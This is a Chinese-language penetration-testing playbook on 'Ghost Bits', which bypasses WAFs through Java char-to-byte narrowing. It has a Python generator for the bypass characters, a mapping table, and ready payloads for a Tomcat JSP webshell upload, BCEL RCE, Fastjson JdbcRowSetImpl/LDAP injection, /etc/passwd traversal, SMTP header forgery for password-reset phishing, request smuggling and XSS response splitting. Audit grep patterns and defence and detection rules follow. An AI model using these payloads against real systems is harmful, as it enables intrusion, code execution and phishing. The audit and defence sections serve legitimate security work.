# Ghost Bits / Cast Attack（Java char 窄化 WAF 绕过原语）

> **何时用**: Java 后端 + 前置 WAF/IDS 拦字面 payload + 目标 sink 在 {SQLi/反序列化/上传/路径穿越/CRLF/走私/SMTP 注入} 之中 → 判定"blocked"前必试 Ghost 变体。非 Java 后端不适用。
> 这不是独立漏洞类，是让其他 playbook payload 穿透 WAF 的使能原语。完整 WAF 绕过决策树（编码/协议/产品矩阵等非窄化路线）见 `waf-bypass.md`。

## 1. 原理与双视图模型

Java `char` 是 16 位（UTF-16 码元），协议层（HTTP/SMTP/Redis RESP/文件路径）是 8 位字节。大量代码静默窄化——高 8 位丢失（Ghost Bits）:

```java
byte b = (byte) ch;        // 0x966A -> 0x6A
out.write(ch);             // OutputStream.write(int) 只留低 8 位
dos.writeBytes(str);       // DataOutputStream 逐 char 写低字节
int v = ch & 0xFF;         // 显式低字节掩码
```

双视图（漏洞成立 = 两视图不一致）:
- **View A 字符串层**（WAF/业务校验/日志）: 看到 陪/阮/瘍 等"无害 Unicode 文本"→ 放行
- **View B 字节层**（协议/文件系统/解析器/类加载器）: 窄化重建出 `j . \r \n` → 执行危险语义

正确写法对照（审计时区分）: `str.getBytes(StandardCharsets.UTF_8)` 是安全的显式编码，多字节字符产出多字节序列。

### 字符生成器

```python
def ghost(target_byte: int, k: int = 0x01) -> str:
    """返回低 8 位等于 target_byte 的 Unicode 字符。每个危险字节 255 个候选。"""
    if 0xD8 <= k <= 0xDF:
        raise ValueError("surrogate range")   # 代理区非法标量，JVM 会先替换，绕不过窄化点
    return chr(((k & 0xFF) << 8) | (target_byte & 0xFF))
```

k 选择: Latin Extended（k=0x01，UTF-8 两字节）适合紧凑 HTTP 头；CJK（k=0x96/0x40，三字节）伪装正常亚洲文本；请求间轮换 k 防自适应 WAF。

## 2. 三族根因

| Family | 机理 | 代表代码 | 典型影响 |
|---|---|---|---|
| A 真实高位截断 | 无条件窄化 | `(byte)ch` / `&0xFF` / `write(ch)` / `writeBytes` | Tomcat filename*、BCEL、Lettuce、Angus Mail、HttpClient ≤4.5.9 |
| B 位运算折叠 | 非法字符折叠成合法 | Jetty `fromHexDigit: (c&0x1F)+((c>>6)*25)-16` | `%2>`→`%2E`=`.`；Openfire/GeoServer |
| C 宽松 Unicode 归一化 | 数字类别/低 8 位查表 | `Character.digit(c,16)` 接受全角泰文；Jackson `sHexValues[ch&0xFF]` | Fastjson \u/\x、全角路径穿越、Jackson SQLi 走私 |

Family B 算例（Jetty）: `'>'(0x3E)`: (0x3E&0x1F)=30 + (0x3E>>6)*25=0 − 16 = 14 = 0xE → `%2>` ≡ `%2E`。同理 `%2^`、`%2~`、`%6>`(→n)。

payload 形态选择: A 送 Unicode 替换字符；B 送 `%X>` 类折叠三元组；C 送全角/泰文数字。

## 3. 核心映射表

规则: `codepoint = (k<<8) | T`，同字节任意 k 候选均有效（255 个），下表为常用示例（验证: `chr(0x962E & 0xFF) == '.'`）:

| 字节 | 用途 | Latin(k=0x01) | CJK 常用 |
|---|---|---|---|
| `\r` 0x0D | CRLF/走私 | ĉ→č U+010D | 瘍 U+760D / 閍 U+960D（\xe7\x98\x8d）|
| `\n` 0x0A | CRLF/日志 | Ċ U+010A | 瘊 U+760A / 閊 U+960A（\xe7\x98\x8a）|
| ` ` 0x20 | 头断行 | Ġ U+0120 | 阠 U+9620 |
| `"` 0x22 | JSON/引号断串 | Ģ U+0122 | 阢 U+9622 |
| `%` 0x25 | 编码前缀 | ĥ U+0125 | 严 U+4E25 |
| `'` 0x27 | SQL 断串 | ħ U+0127 | 阧 U+9627 |
| `(` `)` | EL/SpEL/OGNL | Ȩ/ȩ | 阨 U+9628 / 阩 U+9629 |
| `.` 0x2E | 穿越/扩展名 | Į U+012E | 阮 U+962E（\xe9\x98\xae）|
| `/` 0x2F | 路径分隔 | į U+012F | 丯 U+4E2F / 阯 U+962F（\xe9\x98\xaf）|
| `0-9` | hex 数字构造 | İıĲĳĴĵĶķĸĹ | 丰 U+4E30 失 U+5931 甲 U+7532 耳 U+8033 阴阵阶阷阸阹 |
| `;` 0x3B | 命令分隔 | Ļ U+013B | 阻 U+963B |
| `<` `>` | XSS/XML | ļ/ľ U+023C/013E | 阼 U+963C / 阾 U+963E |
| `=` 0x3D | 参数赋值 | Ľ U+013D | 阽 U+963D |
| `@` 0x40 | @type/邮箱 | ŀ U+0140 | 䁀 U+4040 |
| `a` `c` `l` `s` | class 关键字 | š/ţ/Ŭ/ų | ᙡ U+1661 / 㹣 U+3E63 / ౬ U+0C6C / ⑳ U+2473 |
| `e` | hex e | ť U+0165 | 来 U+6765 |
| `j` | .jsp | Ū U+016A | 陪 U+966A |
| `n` `r` `t` | Runtime/union | Ů/Ų/Ŵ | 陮 U+966E / 䁲 U+4072 / 䁴 U+4074 |
| `u` | \u 转义 | ŵ U+0175 | 灵 U+7075 |

关键词预构建: `class` = 㹣౬ᙡ⑳⑳；`..` = 阮阮；`../` = 阮阮阯；CRLF = 瘍瘊（UTF-16: \u760D\u760A）。
完整 0x00–0x7E 双候选表按本表规则现场推导（勿死记单一字符，WAF 学会后换 k）。

## 4. 组件配方

### 4.1 Tomcat filename* 上传 Webshell（A）

```
Content-Disposition: attachment; filename*=UTF-8''1.陪sp
```
WAF/扩展名过滤见 `1.陪sp` → Tomcat RFC2231 解码 陪→0x6A→j → 落盘 `1.jsp`。可叠加 阮/阯 穿越。

### 4.2 BCEL ClassLoader RCE（A）

`$$BCEL$$` 后每字节包进 Ghost 字符；JavaReader→ByteArrayOutputStream `bos.write(ch)` 循环还原出合法 class → defineClass → RCE。WAF 只见 CJK 文本。修复: BCEL ≥6.12.0。

### 4.3 Fastjson / Jackson JSON 走私（B+C）

```json
{"\u４_type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x"}   // 全角４→4
{"\x4_type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x"}    // \x4_ → 4*16+0=0x40='@'
{"q":"\u丰丰耳失 union select 1,2,3 -- "}                                    // Jackson charToHex → \u0031 → "1 union select…"
```
Fastjson \x 非法字符默认 0；Jackson `sHexValues[ch & 0xFF]` 先掩码后查表。SQL 模板配 sqli-advanced.md。

### 4.4 URL 解码层（A+B）

```
/api/v1/data?file=阮阮阯阮阮阯etc阯passwd          → ../../etc/passwd
/setup/setup-s/%2>%2>/%2>%2>/log.jsp               → ../../（Jetty 折叠）
?cmd=Ru%6>time                                     → Runtime
```

**Spring CVE-2025-41242**（spring.io 核验）: `阮严灵丰丰甲来` → `.%u002e` → 解码 `..`。限定条件（缺一不可）: WAR/内嵌容器 + 容器不拒绝可疑序列 + Spring 静态资源服务；**Tomcat/Jetty 默认配置不受影响**。影响 6.2.0-6.2.9/6.0.0-6.1.21/5.3.43≤，修复 6.2.10。根因: 旧 uriDecode `baos.write(ch)` 窄化（修复 commit 24e66b6）。isInvalidPath 校验时无字面 `..`，校验后解码产出——先校验后解码次序缺陷。vulhub PR #773 可复现。

Spring4Shell 复活: `name*="㹣౬ᙡ⑳⑳.module.classLoader..."`（class 全 Ghost 化）。

### 4.5 CRLF 家族（A）

走私字符 瘍瘊（\xe7\x98\x8d\xe7\x98\x8a / \u760D\u760A）:

```
# Angus/Jakarta Mail SMTP 注入（ASCIIUtility (byte)ch）
From: hacker@evil.com瘍瘊Subject: Reset瘍瘊To: victim@org.com瘍瘊瘍瘊Your code is 1234
# → SMTP 服务器看到完整伪造头+体；密码重置劫持钓鱼（SPF/DKIM 合法）
# 实例: CVE-2025-57733（JetBrains TeamCity <2025.07.1，NVD 核验；非 Jakarta Mail 本体）

# Apache HttpClient ≤4.5.9 请求走私（HTTPCLIENT-1974/1978，修复 4.5.10+/5.x）
X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 0\r\n\r\nGET /public HTTP/1.1

# JDK HttpServer 响应拆分（CVE-2026-21933，Oracle CPU 2026-01，8u471/11.0.29/17.0.17/21.0.9/25.0.1）
?ref=Cu瘍瘊Content-Type: text/html瘍瘊Content-Length: 33瘍瘊瘍瘊<script>alert(1)</script>
```

同型: Lettuce RESP 走私（→ CONFIG SET dir+SAVE 链）、Jodd 路径穿越、XMLWriter 标签注入、ActiveJ CRLF、Vert.x MultipartParser。

## 5. 受影响组件矩阵

| 组件 | 攻击面 | Family | CVE/Issue | 修复 |
|---|---|---|---|---|
| Tomcat | filename* 上传 | A | advisory | 最新 9/10/11 |
| Commons BCEL | ClassLoader RCE | A | advisory | ≥6.12.0 |
| Jackson | \u JSON 走私 | A+C | advisory | 最新 2.x |
| Fastjson | \u/\x+autotype | C | 复活 CVE-2017-18349 | 最新 2.x |
| Spring | 路径遍历 | A | CVE-2025-41242 | 6.2.10+ |
| Spring | classLoader 链 | A | 复活 CVE-2022-22965 | WAF 过滤 |
| Jetty | %2> 折叠 | B | 复活 CVE-2023-32315 | 11/12.x |
| Undertow/Vert.x | URL 解码+multipart | A | advisory | 最新 |
| Angus/Jakarta Mail | SMTP CRLF | A | 实例 CVE-2025-57733(TeamCity) | 最新 |
| HttpClient | 头 CRLF 走私 | A | HTTPCLIENT-1974/1978 | ≥4.5.10 |
| JDK HttpServer | 响应拆分 | A | CVE-2026-21933 | JDK 公告 |
| Lettuce | RESP CRLF | A | advisory | 最新 |
| Jodd/XMLWriter/ActiveJ | 穿越/标签/CRLF | A | advisory | 最新 |
| GeoServer | 复活 RCE | B | 复活 CVE-2024-36401 | ≥2.28.3 |
| Openfire | 复活认证绕过 | B | 复活 CVE-2023-32315 | ≥5.0.4 |

"复活" = CVE 已修但 WAF 拦字面签名，Ghost 变体穿透 WAF 后老漏洞在未升级目标上重新可达。

## 6. 审计与黑盒测试

### 6.1 SAST 三层 grep

```
# Tier 1 Family A
\(byte\)\s*\w+ | &\s*0[xX][fF][fF] | &\s*255 | \.write\(\s*[a-zA-Z_]\w*\s*\) | writeBytes\s*\( | StringBufferInputStream | String\.getBytes\s*\(\s*int
# Tier 2 Family B+C
Character\.digit\s*\( | fromHexDigit | convertHexDigit | fromHex\s*\( | uriDecode | URLDecoder\.decode | sHexValues\[ | & 0x1F\)\s*\+\s*\(.*>>.*\) \* 25
# Tier 3 高风险包装器
RFC2231 | JavaReader | ASCIIUtility | LineParser | ChunkedDecoder | charToHex | encodeUTF8
```

五维风险模型: 可控输入 + 校验在窄化前 + 窄化在校验后 + 结果进协议语法 + 后续二次解码 = HIGH。

### 6.2 差分测试（找新 sink，协议无关）

1. 每次一个字节 T（优先 `. / % \r \n @ j s`）
2. 候选集 C={chr((k<<8)|T), k∈1..255}，剔除 0xD8-0xDF
3. 同位置分别发: 候选字符 / 字面 T / 中性 X
4. 比较状态码、响应长度、内容哈希、日志行
5. 候选响应 ≡ T 且 ≠ X → 窄化 sink；按 Server 头/错误栈聚类，一个 sink ≈ 整个框架版本受影响

## 7. 防御五层 + WAF 多视图检测

1. 源码: 禁 `(byte)ch`/`&0xFF`/`write(ch)`/`writeBytes`；用 `getBytes(UTF_8)` 或 ASCII 白名单
2. 解码器: 非法输入直接拒绝，绝不默认折叠为 0/低 8 位
3. 次序: 严格解码 → NFC/NFKC → 协议归一化 → 安全检查 → 执行
4. 协议字段白名单；头/地址中拒绝 CR/LF
5. WAF 多视图: 同时查 raw / low_byte / url_decoded / NFKC 视图

高信号低误报规则:
```
ALERT IF: 危险 token 命中 {low_byte ∪ url_lax_hex ∪ u_escape} AND 未命中 raw
```
lax_hex 需复刻 Jetty: `(ord(c)&0x1F) + ((ord(c)>>6)*25) - 16`。

蓝队信号: 日志在文件名/头值/邮件地址位置出现 CJK；hex dump 中非 ASCII 字节紧邻协议分隔符；扫描器"奇怪 200"未告警（Java 栈 2025-2026 最常见原因）。

**同族——Go rune/byte 计数差**: `len([]rune(s))>32` 校验 + `len([]byte(s))` 拷贝——emoji 4 字节计 1 rune，8 emoji+"`;cmd\n" 过校验 40 字节溢出。区别: Ghost Bits 是值域窄化（char→byte），Go 是长度语义差（rune vs byte 计数）。
